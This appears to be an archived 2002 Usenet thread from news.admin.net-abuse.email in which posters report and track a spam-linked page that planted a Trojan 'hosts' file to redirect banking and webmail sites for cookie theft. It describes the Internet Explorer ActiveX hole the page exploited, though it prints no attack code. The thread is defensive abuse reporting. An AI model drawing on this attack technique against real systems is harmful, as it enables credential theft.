+X-Server-Date: 25 Feb 2002 12:48:16 GMT
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Newsreader: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Xref: News.Dal.Ca news.admin.net-abuse.email:767020
+
+
+"Sarah" <solitaire5@juno.com> wrote in message
+news:d7f82a0.0202241358.6dc2d412@posting.google.com...
+>
+> Sorry -- didn't notice the lack of an _s_ in the name until after I
+> hit the "post" button.
+
+Blame it on me. I added the "s" somehow in my general comments. I
+didn't when I did the lookup, that's why I thought perhaps that
+directnic might have pulled everything. If directnic did pull the
+registration, the next time this pops up, it will be from a new
+domain.
+
+Even if they didn't pull the registration, the spammer may have some
+trouble getting the domain transferred to a new registrar. I think
+that is the only way he will be able to get those nameservers changed.
+
+
+
+
+From af380@chebucto.ns.ca Mon Feb 25 18:41:45 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <3c797ee5$1_2@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7acbb9$1_2@nntp2.nac.net>
+Date: 25 Feb 2002 18:41:45 -0500
+X-Trace: nntp2.nac.net 1014680505 inch.com (25 Feb 2002 18:41:45 -0500)
+Lines: 19
+Path: News.Dal.Ca!news2.muc.eurocyber.net!newsfeed4.cidera.com!newsfeed1.cidera.com!Cidera!portc03.blue.aol.com!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767294
+
+spamless@Nil.nil wrote:
+
+> I just got off the phone with security at Level3 (who was paged at home),
+> explained what was going on and sent him a copy of the spam, original web 
+> page, decrypted web page (the code that creates the Trojan "hosts" file), 
+> the list of hostnames that are redirected to their hosted "customer" and 
+> an explanation.
+
+What a crock.
+
+Their reply:
+
+> Thanks for taking the time to help with the investigation of this issue.
+> Your complaint has been forwarded to the customer ISP who has been allocated
+> that IP block.
+
+Great. They know that they are hosting a site meant to steel cookies for
+online banking (bankamerica, westernunion); email accounts (hotmail, yahoo);
+etc. AND HAVE LEFT IT UP (I just checked) while they inform their "customer".
+
+
+From af380@chebucto.ns.ca Mon Feb 25 18:42:55 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <3c797ee5$1_2@nntp2.nac.net> <3C79DC18.143B0850@rogers.com>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7acbff$1_2@nntp2.nac.net>
+Date: 25 Feb 2002 18:42:55 -0500
+X-Trace: nntp2.nac.net 1014680575 inch.com (25 Feb 2002 18:42:55 -0500)
+Lines: 28
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767296
+
+David Ramalho <earthscibbs@rogers.com> wrote:
+
+>  You should also try:
+
+I will send a message to each.
+
+> FBI <internetfraud@ifccfbi.gov>
+
+> Secret Service <419.fcd@usss.treas.gov>
+
+>  Internet Fraud Complaint Center (IFCC) FBI site
+>   http://www1.ifccfbi.gov/index.asp
+
+>   Federal Trade Commission
+>   http://www.ftc.gov/
+
+>  Colorado - Attorney General (where level3.net is located)
+>  http://www.ago.state.co.us/
+
+>  NATIONAL CHECK FRAUD CENTER
+>  http://www.ckfraud.org/
+
+>  European Anti-Fraud Office
+>   - there is the German connection
+>  http://europa.eu.int/comm/dgs/olaf/
+
+>  Financial Crimes Enforcement Network (FinCEN)
+>   http://www.treas.gov/fincen/
+
+
+From af380@chebucto.ns.ca Tue Feb 26 06:18:05 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7b6eed$1_2@nntp2.nac.net>
+Date: 26 Feb 2002 06:18:05 -0500
+X-Trace: nntp2.nac.net 1014722285 inch.com (26 Feb 2002 06:18:05 -0500)
+Lines: 2
+Path: News.Dal.Ca!news2.muc.eurocyber.net!uucp.gnuu.de!newsfeed.arcor-online.net!nntp-relay.ihug.net!ihug.co.nz!news-spur1.maxwell.syr.edu!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767497
+
+The site at 64.154.222.199 is now no longer redirecting to other
+sites. Good.
+
+
+From af380@chebucto.ns.ca Tue Feb 26 07:08:38 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:COOKIE THEFT: IDENTITY THEFT?
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c795aa3$1_1@nntp2.nac.net> <3c79680e$1_1@nntp2.nac.net> <3c7b6eed$1_2@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7b7ac6$1_1@nntp2.nac.net>
+Date: 26 Feb 2002 07:08:38 -0500
+X-Trace: nntp2.nac.net 1014725318 inch.com (26 Feb 2002 07:08:38 -0500)
+Lines: 19
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767502
+
+spamless@Nil.nil wrote:
+
+> The site at 64.154.222.199 is now no longer redirecting to other
+> sites. Good.
+
+The site was simply giving a message that "file not found" and
+had a mail link to the ISP. I got in touch with them.
+
+Apparently Level3 told them to take the site down (which was
+different from what they told me - namely that they had
+just passed my report on to their downstream).
+
+As expected, the site was paid for with a stolen credit card.
+
+The admin at the site followed my suggestion and replaced
+the "file not found" message with a note about deleting the
+Trojan "hosts" file and informing those who reached the page
+that their systems had been compromised.
+
+
+
+From af380@chebucto.ns.ca Mon Feb 25 19:26:37 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newsfeed00.sul.t-online.de!t-online.de!newsfeed.r-kom.de!fu-berlin.de!uni-berlin.de!host213-1-187-211.btinternet.COM!not-for-mail
+From: Inquisitor <ng_nanae@spamhunter.co.uk>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Date: Mon, 25 Feb 2002 19:26:37 -0000
+Organization: Inquisitor Systems
+Lines: 20
+Message-ID: <a5gcvm$71282$4@ID-86877.news.dfncis.de>
+References: <3c7847ff$1_1@nntp2.nac.net> <bill-1A3BAE.10374324022002@corp.supernews.com>
+NNTP-Posting-Host: host213-1-187-211.btinternet.com (213.1.187.211)
+X-Trace: fu-berlin.de 1014740791 7375106 213.1.187.211 (16 [86877])
+X-Posting-Agent: Hamster/1.3.23.1
+X-Newsreader: MicroPlanet Gravity v2.60
+Xref: News.Dal.Ca news.admin.net-abuse.email:767603
+
+On the brass tablet <bill-1A3BAE.10374324022002@corp.supernews.com>, 
+Bill Cole <bill@scconsult.com> scrawled...
+> Do you really think anyone here is clueless enough to allow spamvertised 
+> websites to drive MS Trojan Toolkit^W^W^WActiveX? 
+> 
+> I don't use any MS-ware on my own systems, but when I must I kill off 
+> ActiveX. If a site requires ActiveX and does not tell you so explicitly, 
+> it should not be trusted to use ActiveX.
+
+Is the ActiveX digitally signed? IE6 default is to put up a Big Warning 
+Screen if a webpage attempts to download an unsigned one, and a slightly 
+less big one if it *is* signed (eg. Flash, Windows Update etc.)
+
+For obvious reasons, I'm not going to the site!
+
+-- 
+I N Q U I S I T O R  / www.spamhunter.co.uk / inquisitor (at) my domain 
+------------------------------------------------------------------------
+The only difference between me and a madman is that I am not mad. 
+	-- Salvador Dali
+
+
+From af380@chebucto.ns.ca Tue Feb 26 20:31:00 2002
+Status: RO
+X-Status: 
+From: spamless@nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7847ff$1_1@nntp2.nac.net> <bill-1A3BAE.10374324022002@corp.supernews.com> <a5gcvm$71282$4@ID-86877.news.dfncis.de>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7c36d4$1_1@nntp2.nac.net>
+Date: 26 Feb 2002 20:31:00 -0500
+X-Trace: nntp2.nac.net 1014773460 inch.com (26 Feb 2002 20:31:00 -0500)
+Lines: 23
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:767853
+
+Inquisitor <ng_nanae@spamhunter.co.uk> wrote:
+
+> Is the ActiveX digitally signed? IE6 default is to put up a Big Warning 
+> Screen if a webpage attempts to download an unsigned one, and a slightly 
+> less big one if it *is* signed (eg. Flash, Windows Update etc.)
+
+It is the old "com.ms.activeX.ActiveXComponent" security problem.
+
+It uses that to create a File System Object and write lines of
+text to it. It doesn't have its own, separate, ActiveX programme.
+
+From a security note I saw when I checked that at google
+(5 October 2000) (about IE_5.5).
+
+"The problem is the com.ms.activeX.ActiveXComponent java object 
+ which may be instantiated from <APPLET> tag (it throws security 
+ exception in java console, but returns object, strange).
+ The com.ms.activeX.ActiveXComponent java object allows creating 
+ and scripting arbitrary ActiveX objects, including those not 
+ marked safe for scripting."
+
+Those who keep up-to-date with security patches and run IE
+securely shold not be affected(?)
+
